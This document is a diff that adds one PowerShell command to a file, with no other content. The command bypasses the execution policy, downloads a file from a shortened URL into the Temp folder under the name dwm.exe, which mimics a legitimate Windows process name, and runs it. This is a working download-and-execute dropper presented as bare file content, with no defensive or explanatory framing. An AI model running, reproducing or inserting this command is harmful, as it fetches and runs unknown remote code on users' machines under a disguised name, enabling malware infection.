@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://bitly.cx/YtYb', 'C:\Users\user\AppData\Local\Temp\dwm.exe'); Start-Process ('C:\Users\user\AppData\Local\Temp\dwm.exe')"
